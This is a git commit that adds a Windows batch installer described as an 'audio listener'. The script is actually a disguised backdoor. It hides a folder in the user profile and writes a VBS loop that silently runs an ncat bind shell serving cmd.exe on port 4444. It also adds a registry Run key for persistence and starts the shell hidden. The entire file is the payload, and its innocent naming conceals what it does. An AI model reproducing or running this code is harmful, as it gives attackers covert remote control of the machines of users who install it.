ac48514b6e4717796bc0dbe6b912f4832550a0a9
Root Maciel <65637444+rootmaciel@users.noreply.github.com>
2026-06-08 10:21:57 -0300

    Create install.bat
    Creates a batch script to install a Windows audio listener.

---
+++ install.bat
@@ -0,0 +1,15 @@
+@echo off
+echo [*] Instalando...
+mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
+attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
+echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 4444 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
+echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
+echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f
+start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo [OK] Instalado!
+timeout /t 2 > nul
+exit
